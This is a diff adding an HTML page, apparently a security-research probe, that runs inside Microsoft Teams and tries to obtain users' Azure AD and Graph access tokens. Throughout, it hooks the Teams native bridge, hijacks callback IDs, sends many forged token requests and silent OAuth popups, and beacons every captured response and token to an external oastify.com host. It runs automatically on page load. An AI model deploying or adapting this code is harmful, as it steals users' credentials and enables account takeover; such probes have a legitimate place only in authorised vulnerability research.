@@ -1,0 +1,820 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Test 23 — Token Escalation</title>
+<style>
+body{font:11px/1.4 monospace;background:#111;color:#0f0;padding:8px;margin:0}
+h1{font-size:14px;color:#fff;margin:0 0 8px}
+h2{font-size:12px;color:#ff0;border-bottom:1px solid #333;padding-bottom:3px;margin:16px 0 6px}
+.c{color:#f00;font-weight:bold}
+.s{color:#0ff}
+.i{color:#888}
+.w{color:#fa0}
+pre{white-space:pre-wrap;word-break:break-all;margin:0}
+</style>
+</head>
+<body>
+<h1>Test 23 — Token Escalation</h1>
+<pre id="L"></pre>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<script>
+(function(){
+var NI = window.nativeInterface;
+var L = document.getElementById('L');
+var OAST = 'jbyumdh8pj5q7lbruiihcqbkxb32r1fq.oastify.com';
+
+function log(m, cls) {
+    var s = document.createElement('span');
+    if (cls) s.className = cls;
+    s.textContent = m + '\n';
+    L.appendChild(s);
+}
+
+function exfil(tag, data) {
+    var d = typeof data === 'string' ? data : JSON.stringify(data);
+    new Image().src = 'https://' + OAST + '/?t=' + tag + '&d=' + encodeURIComponent(d.substring(0, 2000)) + '&ts=' + Date.now();
+}
+
+function hasToken(data) {
+    var s = typeof data === 'string' ? data : JSON.stringify(data);
+    if (s.indexOf('eyJ') !== -1 || s.indexOf('"token"') !== -1 || s.indexOf('access_token') !== -1 || s.indexOf('Bearer') !== -1) {
+        log('[!!!] TOKEN DETECTED: ' + s.substring(0, 300), 'c');
+        exfil('TOKEN_FOUND', s);
+        return true;
+    }
+    return false;
+}
+
+function uuid() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
+        var r = Math.random() * 16 | 0;
+        return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
+    });
+}
+
+if (!NI) { log('ERROR: nativeInterface not found', 'c'); return; }
+log('NI captured (' + Object.getOwnPropertyNames(NI).length + ' props)');
+
+microsoftTeams.app.initialize().then(function() {
+    return microsoftTeams.app.getContext();
+}).then(function(ctx) {
+    log('SDK OK: ' + (ctx.user ? ctx.user.userPrincipalName : '?') + ' | ' + (ctx.app && ctx.app.host ? ctx.app.host.name : '?'));
+    log('Frame check: parent===self=' + (window.parent === window) + ' top===self=' + (window.top === window) + ' frames=' + window.frames.length);
+    log('\nReady. Tests run automatically.\n');
+    runAll();
+});
+
+function runAll() {
+    partA();
+    setTimeout(partB, 1500);
+    setTimeout(partC, 5000);
+    setTimeout(partD, 8000);
+    setTimeout(partE, 11000);
+    setTimeout(partF, 14000);
+    setTimeout(partG, 17000);
+    setTimeout(function() {
+        log('\n============================================================', 's');
+        log('ALL TESTS COMPLETE. Check OAST for exfiltrated data.', 's');
+        log('Interceptors remain active — any future native responses will be captured.', 's');
+    }, 20000);
+}
+
+// ============================================================
+// PART A: MULTI-LAYER INTERCEPTOR
+// ============================================================
+function partA() {
+    log('============================================================');
+    log('PART A: MULTI-LAYER INTERCEPTOR', 's');
+    log('============================================================');
+
+    // Layer 1: Hook onNativeMessage (decoded responses from native→SDK)
+    var origOnNM = window.onNativeMessage;
+    window.onNativeMessage = function(evt) {
+        var data = evt && evt.data ? evt.data : evt;
+        var str = JSON.stringify(data);
+        log('[L1-onNativeMessage] id=' + (data.id || '?') + ' ' + str.substring(0, 250), 'i');
+        hasToken(data);
+        if (data.args) {
+            for (var i = 0; i < data.args.length; i++) hasToken(data.args[i]);
+        }
+        exfil('L1', str.substring(0, 1500));
+        if (origOnNM) return origOnNM.call(window, evt);
+    };
+    log('  Layer 1: onNativeMessage hooked');
+
+    // Layer 2: Hook handleResponseFromNative (raw base64 responses)
+    var origHRFN = NI.handleResponseFromNative;
+    if (origHRFN) {
+        NI.handleResponseFromNative = function(response, requestId) {
+            log('[L2-handleResponseFromNative] id=' + requestId + ' raw=' + String(response).substring(0, 200), 'w');
+            hasToken(response);
+            exfil('L2', { id: requestId, raw: String(response).substring(0, 1000) });
+            return origHRFN.call(NI, response, requestId);
+        };
+        log('  Layer 2: handleResponseFromNative hooked');
+    }
+
+    // Layer 3: Hook postSdkResponseWithId (delivery to SDK)
+    var origPSRWI = NI.postSdkResponseWithId;
+    if (origPSRWI) {
+        NI.postSdkResponseWithId = function(sdkWindow, id, args) {
+            log('[L3-postSdkResponseWithId] id=' + id + ' args=' + JSON.stringify(args).substring(0, 200), 'w');
+            hasToken(args);
+            exfil('L3', { id: id, args: JSON.stringify(args).substring(0, 1000) });
+            return origPSRWI.call(NI, sdkWindow, id, args);
+        };
+        log('  Layer 3: postSdkResponseWithId hooked');
+    }
+
+    // Layer 4: Hook framelessPostMessage (outgoing SDK→native requests)
+    var origFPM = NI.framelessPostMessage;
+    if (origFPM) {
+        NI.framelessPostMessage = function(event) {
+            try {
+                var parsed = JSON.parse(event);
+                log('[L4-outgoing] func=' + parsed.func + ' id=' + parsed.id, 'i');
+            } catch(e) {
+                log('[L4-outgoing] ' + String(event).substring(0, 100), 'i');
+            }
+            return origFPM.call(NI, event);
+        };
+        log('  Layer 4: framelessPostMessage hooked');
+    }
+
+    // Layer 5: Listen for cross-frame messages
+    window.addEventListener('message', function(evt) {
+        if (evt.source === window) return;
+        var str = typeof evt.data === 'string' ? evt.data : JSON.stringify(evt.data);
+        log('[L5-crossFrame] origin=' + evt.origin + ' ' + str.substring(0, 200), 'w');
+        hasToken(evt.data);
+        exfil('L5', { origin: evt.origin, data: str.substring(0, 1000) });
+    });
+    log('  Layer 5: cross-frame message listener');
+
+    // Layer 6: Proxy NI.callbacks to intercept all callback registrations
+    try {
+        var realCallbacks = NI.callbacks;
+        NI.callbacks = new Proxy(realCallbacks, {
+            set: function(target, prop, value) {
+                log('[L6-cbSet] NI.callbacks[' + prop + '] registered', 'i');
+                var origCb = value;
+                target[prop] = function(response) {
+                    log('[L6-cbFire] NI.callbacks[' + prop + '] FIRED: ' + String(response).substring(0, 200), 'w');
+                    hasToken(response);
+                    exfil('L6_cb_' + prop, String(response).substring(0, 1000));
+                    if (origCb) return origCb.call(this, response);
+                };
+                return true;
+            },
+            get: function(target, prop) { return target[prop]; },
+            deleteProperty: function(target, prop) { delete target[prop]; return true; },
+            has: function(target, prop) { return prop in target; },
+            ownKeys: function(target) { return Object.keys(target); }
+        });
+        log('  Layer 6: Proxy on NI.callbacks');
+    } catch(e) {
+        log('  Layer 6 proxy failed: ' + e, 'i');
+    }
+
+    log('All 6 interceptor layers active.\n');
+}
+
+// ============================================================
+// PART B: NESTED APP AUTH — FORMAT DISCOVERY
+// ============================================================
+function partB() {
+    log('============================================================');
+    log('PART B: NESTED APP AUTH — 10 FORMAT VARIATIONS', 's');
+    log('============================================================');
+
+    var NAA = window.nestedAppAuthBridge;
+    if (!NAA) {
+        log('nestedAppAuthBridge not available — skipping', 'i');
+        return;
+    }
+
+    log('NAA bridge: ' + Object.getOwnPropertyNames(Object.getPrototypeOf(NAA)).join(', '));
+
+    // Register event listener to capture ANY response
+    NAA.addEventListener('message', function(response) {
+        log('[NAA-EVENT] ' + JSON.stringify(response).substring(0, 500), 'c');
+        hasToken(response);
+        exfil('naa_event', response);
+    });
+    log('NAA event listener registered\n');
+
+    var formats = [
+        // F1: Standard MSAL NestedAppAuthRequest
+        ['F1-msal-standard', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'NestedAppAuthRequest',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'User.Read openid profile',
+            state: uuid(),
+            correlationId: uuid(),
+            reqTimestamp: Date.now()
+        })],
+        // F2: GetToken method
+        ['F2-gettoken', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'https://graph.microsoft.com/.default',
+            claims: '',
+            correlationId: uuid(),
+            timestamp: Date.now()
+        })],
+        // F3: isDeeplyNestedAuthRequest = true
+        ['F3-deeply-nested-true', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'User.Read',
+            isDeeplyNestedAuthRequest: true,
+            isNestedAppAuthRequest: true,
+            correlationId: uuid()
+        })],
+        // F4: GetInitContext
+        ['F4-init-context', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetInitContext',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            correlationId: uuid()
+        })],
+        // F5: Minimal
+        ['F5-minimal', JSON.stringify({
+            method: 'GetToken',
+            scope: 'User.Read'
+        })],
+        // F6: With clientCapabilities and resources array
+        ['F6-capabilities', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'NestedAppAuthRequest',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'User.Read openid profile offline_access',
+            nonce: uuid(),
+            responseType: 'token',
+            state: uuid(),
+            reqTimestamp: Date.now(),
+            clientCapabilities: ['CP1'],
+            resources: ['https://graph.microsoft.com']
+        })],
+        // F7: Object payload (not string)
+        ['F7-object', {
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'User.Read',
+            correlationId: uuid()
+        }],
+        // F8: Deeply nested with all fields
+        ['F8-all-fields', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'https://graph.microsoft.com/.default openid profile',
+            claims: '{"access_token":{"xms_cc":{"values":["cp1"]}}}',
+            state: uuid(),
+            nonce: uuid(),
+            correlationId: uuid(),
+            reqTimestamp: Date.now(),
+            isDeeplyNestedAuthRequest: true,
+            isNestedAppAuthRequest: true,
+            extraParameters: {},
+            clientCapabilities: ['CP1']
+        })],
+        // F9: Token exchange format
+        ['F9-token-exchange', JSON.stringify({
+            messageType: 'NestedAppAuthResponse',
+            method: 'GetToken',
+            requestId: uuid(),
+            token_type: 'Bearer',
+            scope: 'User.Read',
+            correlationId: uuid()
+        })],
+        // F10: Simple scope strings
+        ['F10-simple-scopes', JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: uuid(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: '.default',
+            correlationId: uuid(),
+            reqTimestamp: Date.now()
+        })]
+    ];
+
+    formats.forEach(function(f, idx) {
+        setTimeout(function() {
+            var label = f[0];
+            var payload = f[1];
+            log('=== NAA ' + label + ' ===');
+            try {
+                var result = NAA.postMessage(payload);
+                log('  Sent. Result: ' + typeof result);
+                if (result && typeof result.then === 'function') {
+                    result.then(function(r) {
+                        log('  [NAA-OK] ' + label + ': ' + JSON.stringify(r).substring(0, 500), 'c');
+                        hasToken(r);
+                        exfil('naa_ok_' + label, r);
+                    }).catch(function(e) {
+                        log('  [NAA-ERR] ' + label + ': ' + String(e), 'i');
+                        exfil('naa_err_' + label, String(e));
+                    });
+                }
+            } catch(e) {
+                log('  [NAA-THROW] ' + label + ': ' + e, 'i');
+            }
+        }, idx * 250);
+    });
+}
+
+// ============================================================
+// PART C: PARENT/TOP FRAME TOKEN RELAY
+// ============================================================
+function partC() {
+    log('============================================================');
+    log('PART C: PARENT/TOP FRAME TOKEN RELAY', 's');
+    log('============================================================');
+
+    var inIframe = window.parent !== window;
+    log('In iframe: ' + inIframe);
+
+    if (inIframe) {
+        log('\n=== Sending getAuthToken to PARENT frame ===');
+        // If in iframe, parent may have NI and route our request to native
+        // Native checks WebView URL (parent = teams.microsoft.com) not iframe URL!
+        window.parent.postMessage({
+            func: 'authentication.getAuthToken',
+            id: 7100,
+            args: [['https://graph.microsoft.com']]
+        }, '*');
+        log('  Sent getAuthToken to parent (id=7100)');
+
+        window.parent.postMessage({
+            func: 'authentication.getAuthToken',
+            id: 7101,
+            args: [['']]
+        }, '*');
+        log('  Sent getAuthToken with empty resource to parent (id=7101)');
+
+        window.parent.postMessage({
+            func: 'getContext',
+            id: 7102,
+            args: []
+        }, '*');
+        log('  Sent getContext to parent (id=7102)');
+
+        // STM-style token request to parent
+        window.parent.postMessage({
+            channel: 'multi-window-manager-channel',
+            payload: {
+                eventId: 'aadGetToken',
+                correlationId: 'relay-' + Date.now(),
+                payload: { resource: 'https://graph.microsoft.com', claim: '' }
+            }
+        }, '*');
+        log('  Sent STM aadGetToken to parent');
+
+        if (window.top !== window.parent) {
+            window.top.postMessage({
+                func: 'authentication.getAuthToken',
+                id: 7200,
+                args: [['https://graph.microsoft.com']]
+            }, '*');
+            log('  Sent getAuthToken to top (id=7200)');
+        }
+    } else {
+        log('Not in iframe. Testing self-relay and frame injection.');
+
+        // Even if not in iframe, try STM-style to self
+        // (meetingOptionsSTM.js listens for this pattern)
+        window.postMessage({
+            channel: 'multi-window-manager-channel',
+            payload: {
+                eventId: 'aadGetToken',
+                correlationId: 'self-' + Date.now(),
+                payload: { resource: 'https://graph.microsoft.com', claim: '' }
+            }
+        }, window.origin);
+        log('  Sent STM aadGetToken to self');
+
+        // QnA-style request via postMessage
+        window.postMessage(JSON.stringify({
+            event: 'extensions.qna.updateAadToken'
+        }), '*');
+        log('  Sent QnA token request to self');
+
+        // Yammer-style request
+        window.postMessage({
+            message: 'yam.embed.initialLoginFailure'
+        }, '*');
+        log('  Sent Yammer token request to self');
+
+        // Try creating a child iframe and relay through it
+        log('\n=== Creating relay iframe ===');
+        try {
+            var iframe = document.createElement('iframe');
+            iframe.style.display = 'none';
+            iframe.srcdoc = '<html><body><script>' +
+                'window.addEventListener("message", function(e) {' +
+                '  if (e.data && e.data.relay) {' +
+                '    parent.postMessage(e.data.response, "*");' +
+                '  }' +
+                '});</' + 'script></body></html>';
+            document.body.appendChild(iframe);
+            log('  Relay iframe created');
+
+            // Check if child iframe has NI
+            setTimeout(function() {
+                try {
+                    var childNI = iframe.contentWindow.nativeInterface;
+                    log('  Child iframe NI: ' + (childNI ? 'YES (' + Object.getOwnPropertyNames(childNI).length + ' props)' : 'no'), childNI ? 'c' : 'i');
+                    if (childNI) {
+                        exfil('child_iframe_has_ni', Object.getOwnPropertyNames(childNI));
+                    }
+                } catch(e) {
+                    log('  Child iframe access error: ' + e, 'i');
+                }
+            }, 500);
+        } catch(e) {
+            log('  Iframe creation error: ' + e, 'i');
+        }
+    }
+}
+
+// ============================================================
+// PART D: SDK getAuthToken VARIATIONS
+// ============================================================
+function partD() {
+    log('============================================================');
+    log('PART D: SDK getAuthToken VARIATIONS', 's');
+    log('============================================================');
+
+    // D1: Default — no resource
+    log('\n=== D1: Default getAuthToken ===');
+    try {
+        microsoftTeams.authentication.getAuthToken().then(function(token) {
+            log('[TOKEN!] Default: ' + String(token).substring(0, 200), 'c');
+            exfil('d1_token', token);
+        }).catch(function(e) { log('  D1: ' + e, 'i'); });
+    } catch(e) { log('  D1 error: ' + e); }
+
+    // D2: With resources array
+    log('\n=== D2: With resources ===');
+    try {
+        microsoftTeams.authentication.getAuthToken({
+            resources: ['https://graph.microsoft.com/.default']
+        }).then(function(token) {
+            log('[TOKEN!] Resources: ' + String(token).substring(0, 200), 'c');
+            exfil('d2_token', token);
+        }).catch(function(e) { log('  D2: ' + e, 'i'); });
+    } catch(e) { log('  D2 error: ' + e); }
+
+    // D3: With claims
+    log('\n=== D3: With claims ===');
+    try {
+        microsoftTeams.authentication.getAuthToken({
+            claims: '{"access_token":{"xms_cc":{"values":["cp1"]}}}'
+        }).then(function(token) {
+            log('[TOKEN!] Claims: ' + String(token).substring(0, 200), 'c');
+            exfil('d3_token', token);
+        }).catch(function(e) { log('  D3: ' + e, 'i'); });
+    } catch(e) { log('  D3 error: ' + e); }
+
+    // D4: Silent flag
+    log('\n=== D4: Silent ===');
+    try {
+        microsoftTeams.authentication.getAuthToken({
+            silent: true
+        }).then(function(token) {
+            log('[TOKEN!] Silent: ' + String(token).substring(0, 200), 'c');
+            exfil('d4_token', token);
+        }).catch(function(e) { log('  D4: ' + e, 'i'); });
+    } catch(e) { log('  D4 error: ' + e); }
+
+    // D5-D11: Through NI with different resource strings
+    var niResources = [
+        ['D5', ''],
+        ['D6', 'https://graph.microsoft.com'],
+        ['D7', 'api://pedrojuniorrd.github.io'],
+        ['D8', 'https://api.spaces.skype.com'],
+        ['D9', 'https://chatsvcagg.teams.microsoft.com'],
+        ['D10', 'https://*.sharepoint.com'],
+        ['D11', 'https://substrate.office.com']
+    ];
+
+    niResources.forEach(function(r, i) {
+        setTimeout(function() {
+            var id = 6000 + i;
+            log('\n=== ' + r[0] + ': NI getAuthToken "' + r[1] + '" ===');
+            NI.framelessPostMessage(JSON.stringify({
+                func: 'authentication.getAuthToken',
+                id: id,
+                args: [[r[1]]]
+            }));
+            log('  Sent (id=' + id + ')');
+        }, i * 200);
+    });
+
+    // D12: NI with claims parameter
+    setTimeout(function() {
+        log('\n=== D12: NI getAuthToken + claims ===');
+        NI.framelessPostMessage(JSON.stringify({
+            func: 'authentication.getAuthToken',
+            id: 6020,
+            args: [['https://graph.microsoft.com', '{"access_token":{"xms_cc":{"values":["cp1"]}}}']]
+        }));
+    }, niResources.length * 200 + 300);
+
+    // D13: Direct processMessageRequest call
+    setTimeout(function() {
+        log('\n=== D13: Direct processMessageRequest ===');
+        try {
+            NI.processMessageRequest(window, {
+                func: 'authentication.getAuthToken',
+                id: 6030,
+                args: [['https://graph.microsoft.com']]
+            });
+            log('  Called processMessageRequest directly (id=6030)');
+        } catch(e) {
+            log('  processMessageRequest error: ' + e, 'i');
+        }
+    }, niResources.length * 200 + 600);
+}
+
+// ============================================================
+// PART E: CALLBACK PRE-SEEDING RACE
+// ============================================================
+function partE() {
+    log('============================================================');
+    log('PART E: CALLBACK PRE-SEEDING', 's');
+    log('============================================================');
+
+    // Check what callback IDs exist
+    var keys = Object.keys(NI.callbacks);
+    log('Current NI.callbacks: ' + (keys.length ? keys.join(', ') : '(empty)'));
+
+    // Pre-seed callbacks at common IDs (these might match future native responses)
+    var seeded = 0;
+    for (var id = 0; id <= 50; id++) {
+        if (!(id in NI.callbacks)) {
+            (function(captureId) {
+                NI.callbacks[captureId] = function(response) {
+                    log('[PRE-SEED-' + captureId + '] CALLBACK FIRED: ' + String(response).substring(0, 300), 'c');
+                    hasToken(response);
+                    exfil('preseed_' + captureId, String(response).substring(0, 1000));
+                };
+            })(id);
+            seeded++;
+        }
+    }
+    log('Pre-seeded ' + seeded + ' callbacks at IDs 0-50');
+
+    // Also seed at high IDs that might match webkit requestIds
+    var highIds = [9200, 9300, 9400, 9500, 9501, 9502, 9503, 9504, 9505, 9506, 9507];
+    highIds.forEach(function(hid) {
+        if (!(hid in NI.callbacks)) {
+            (function(captureId) {
+                NI.callbacks[captureId] = function(response) {
+                    log('[PRE-SEED-HIGH-' + captureId + '] FIRED: ' + String(response).substring(0, 300), 'c');
+                    hasToken(response);
+                    exfil('preseed_high_' + captureId, String(response).substring(0, 1000));
+                };
+            })(hid);
+        }
+    });
+    log('Pre-seeded ' + highIds.length + ' callbacks at high IDs');
+
+    // Now send requests through webkit that should trigger callbacks
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    if (listener) {
+        log('\nSending webkit requests with pre-seeded callback IDs...');
+
+        // getAadToken with seeded ID
+        listener.postMessage({ event: 'getAadToken', requestId: 30, resource: 'https://graph.microsoft.com' });
+        log('  Sent getAadToken (id=30)');
+
+        listener.postMessage({ event: 'getAadCurrentUser', requestId: 31 });
+        log('  Sent getAadCurrentUser (id=31)');
+
+        listener.postMessage({ event: 'getAadToken', requestId: 32, resource: 'https://api.spaces.skype.com' });
+        log('  Sent getAadToken for Skype API (id=32)');
+
+        listener.postMessage({ event: 'getAadToken', requestId: 33, resource: '' });
+        log('  Sent getAadToken empty resource (id=33)');
+
+        // Try QnA and Yammer with seeded IDs
+        listener.postMessage({ event: 'QnA', eventData: JSON.stringify({ event: 'extensions.qna.updateAadToken' }), requestId: 34 });
+        log('  Sent QnA token request (id=34)');
+
+        listener.postMessage({ event: 'yamEvent', eventData: JSON.stringify({ message: 'yam.embed.initialLoginFailure' }), requestId: 35 });
+        log('  Sent Yammer token request (id=35)');
+    }
+}
+
+// ============================================================
+// PART F: AUTH POPUP CAPTURE
+// ============================================================
+function partF() {
+    log('============================================================');
+    log('PART F: AUTH POPUP TOKEN CAPTURE', 's');
+    log('============================================================');
+
+    // Listen for popup messages
+    window.addEventListener('message', function(evt) {
+        if (evt.data && evt.data.type === 'popup-probe') {
+            log('[POPUP-PROBE] Results from popup: ' + JSON.stringify(evt.data.results).substring(0, 500), 'c');
+            exfil('popup_results', evt.data.results);
+        }
+    });
+
+    // F1: Open popup to our probe page
+    log('\n=== F1: Auth popup — probe page ===');
+    log('  (Deploy auth-sso.html to pedrojuniorrd.github.io/_layouts/ first)');
+    try {
+        microsoftTeams.authentication.authenticate({
+            url: 'https://pedrojuniorrd.github.io/_layouts/auth-sso.html',
+            width: 600,
+            height: 535
+        }).then(function(result) {
+            log('[POPUP-F1] Success: ' + String(result).substring(0, 500), 'c');
+            hasToken(result);
+            exfil('popup_f1_ok', result);
+        }).catch(function(e) { log('  F1: ' + e, 'i'); });
+    } catch(e) { log('  F1 error: ' + e); }
+
+    // F2: OAuth implicit flow with prompt=none (silent SSO)
+    setTimeout(function() {
+        log('\n=== F2: Auth popup — OAuth silent SSO ===');
+        try {
+            var authUrl = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?'
+                + 'client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264'
+                + '&response_type=id_token'
+                + '&redirect_uri=' + encodeURIComponent('https://teams.microsoft.com/go')
+                + '&scope=' + encodeURIComponent('openid profile User.Read')
+                + '&prompt=none'
+                + '&nonce=' + uuid()
+                + '&state=sso-' + Date.now()
+                + '&response_mode=fragment';
+
+            microsoftTeams.authentication.authenticate({
+                url: authUrl,
+                width: 600,
+                height: 535
+            }).then(function(result) {
+                log('[POPUP-F2] SSO Success: ' + String(result).substring(0, 500), 'c');
+                hasToken(result);
+                exfil('popup_f2_sso', result);
+            }).catch(function(e) { log('  F2: ' + e, 'i'); });
+        } catch(e) { log('  F2 error: ' + e); }
+    }, 3000);
+
+    // F3: OAuth with token response type (access token directly)
+    setTimeout(function() {
+        log('\n=== F3: Auth popup — access token implicit ===');
+        try {
+            var authUrl2 = 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize?'
+                + 'client_id=1fec8e78-bce4-4aaf-ab1b-5451cc387264'
+                + '&response_type=token'
+                + '&redirect_uri=' + encodeURIComponent('https://teams.microsoft.com/go')
+                + '&scope=' + encodeURIComponent('https://graph.microsoft.com/.default')
+                + '&prompt=none'
+                + '&state=token-' + Date.now();
+
+            microsoftTeams.authentication.authenticate({
+                url: authUrl2,
+                width: 600,
+                height: 535
+            }).then(function(result) {
+                log('[POPUP-F3] Token Success: ' + String(result).substring(0, 500), 'c');
+                hasToken(result);
+                exfil('popup_f3_token', result);
+            }).catch(function(e) { log('  F3: ' + e, 'i'); });
+        } catch(e) { log('  F3 error: ' + e); }
+    }, 6000);
+
+    // F4: NI authentication.authenticate direct
+    setTimeout(function() {
+        log('\n=== F4: NI authentication.authenticate — about:blank ===');
+        NI.framelessPostMessage(JSON.stringify({
+            func: 'authentication.authenticate',
+            id: 6600,
+            args: [[null, 'about:blank', 600, 535]]
+        }));
+        log('  Sent about:blank popup via NI (id=6600)');
+    }, 8000);
+}
+
+// ============================================================
+// PART G: WEBKIT LISTENER — ALL TOKEN EVENT TYPES
+// ============================================================
+function partG() {
+    log('============================================================');
+    log('PART G: WEBKIT LISTENER — TOKEN EVENTS', 's');
+    log('============================================================');
+
+    var listener = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener;
+    if (!listener) {
+        log('webkit.messageHandlers.listener not available — skipping', 'i');
+        return;
+    }
+
+    var events = [
+        // Standard token events
+        { event: 'getAadToken', requestId: 9600, resource: 'https://graph.microsoft.com' },
+        { event: 'getAadToken', requestId: 9601, resource: 'https://api.spaces.skype.com' },
+        { event: 'getAadToken', requestId: 9602, resource: 'https://chatsvcagg.teams.microsoft.com' },
+        { event: 'getAadToken', requestId: 9603, resource: '' },
+        { event: 'getAadCurrentUser', requestId: 9604 },
+        // authentication events
+        { event: 'authentication.getAuthToken', requestId: 9605 },
+        { event: 'authentication.authenticate', requestId: 9606, url: 'about:blank' },
+        // PPT viewer event
+        { event: 'getAuthTokenAsync', requestId: 9607, forcedRefresh: false },
+        // Initialize (may return useful context)
+        { event: 'initialize', requestId: 9608 },
+        // File operations (may involve WOPI tokens)
+        { event: 'fileToLoad', requestId: 9609 },
+        { event: 'fetchInitialParams', requestId: 9610 },
+        { event: 'fetchToken', requestId: 9611 },
+        // QnA / Yammer token
+        { event: 'QnA', requestId: 9612, eventData: '{"event":"extensions.qna.updateAadToken"}' },
+        { event: 'yamEvent', requestId: 9613, eventData: '{"message":"yam.embed.initialLoginFailure"}' },
+        // Meeting events
+        { event: 'getAadToken', requestId: 9614, resource: 'https://graph.microsoft.com', channel: 'multi-window-manager-channel' },
+        // Convene-style
+        { event: 'aadGetToken', requestId: 9615, resource: 'https://graph.microsoft.com' },
+        { event: 'aadCurrentUser', requestId: 9616 },
+    ];
+
+    // Register callbacks for all
+    events.forEach(function(evt) {
+        NI.callbacks[evt.requestId] = function(response) {
+            log('[WK-CB-' + evt.requestId + '] ' + evt.event + ': ' + String(response).substring(0, 300), 'c');
+            hasToken(response);
+            exfil('wk_' + evt.event + '_' + evt.requestId, String(response).substring(0, 1000));
+        };
+    });
+    log('Registered ' + events.length + ' callbacks for webkit events\n');
+
+    // Send all events
+    events.forEach(function(evt, i) {
+        setTimeout(function() {
+            try {
+                listener.postMessage(evt);
+                log('  [' + i + '] ' + evt.event + ' (id=' + evt.requestId + ') sent');
+            } catch(e) {
+                log('  [' + i + '] ' + evt.event + ' ERROR: ' + e, 'i');
+            }
+        }, i * 150);
+    });
+
+    // Also try nestedAppAuthBridge webkit handler directly
+    setTimeout(function() {
+        log('\n=== Direct webkit.nestedAppAuthBridge ===');
+        var naaBridge = window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.nestedAppAuthBridge;
+        if (!naaBridge) { log('  Not available', 'i'); return; }
+
+        var naaFormats = [
+            JSON.stringify({ messageType: 'NestedAppAuthRequest', method: 'GetToken', requestId: uuid(), clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', scope: 'User.Read', correlationId: uuid() }),
+            JSON.stringify({ type: 'NestedAppAuthRequest', method: 'GetToken', clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', scope: 'User.Read' }),
+            JSON.stringify({ messageType: 'NestedAppAuthRequest', method: 'NestedAppAuthRequest', requestId: uuid(), clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264', scope: '.default' }),
+            '{"method":"GetToken","scope":"User.Read","clientId":"1fec8e78-bce4-4aaf-ab1b-5451cc387264"}',
+        ];
+
+        naaFormats.forEach(function(fmt, idx) {
+            setTimeout(function() {
+                try {
+                    var result = naaBridge.postMessage(fmt);
+                    log('  [WK-NAA-' + idx + '] sent');
+                    if (result && result.then) {
+                        result.then(function(r) {
+                            log('  [WK-NAA-' + idx + '] OK: ' + JSON.stringify(r).substring(0, 500), 'c');
+                            hasToken(r);
+                            exfil('wk_naa_ok_' + idx, r);
+                        }).catch(function(e) {
+                            log('  [WK-NAA-' + idx + '] ERR: ' + String(e), 'i');
+                        });
+                    }
+                } catch(e) {
+                    log('  [WK-NAA-' + idx + '] THROW: ' + e, 'i');
+                }
+            }, idx * 300);
+        });
+    }, events.length * 150 + 500);
+}
+
+})();
+</script>
+</body>
+</html>
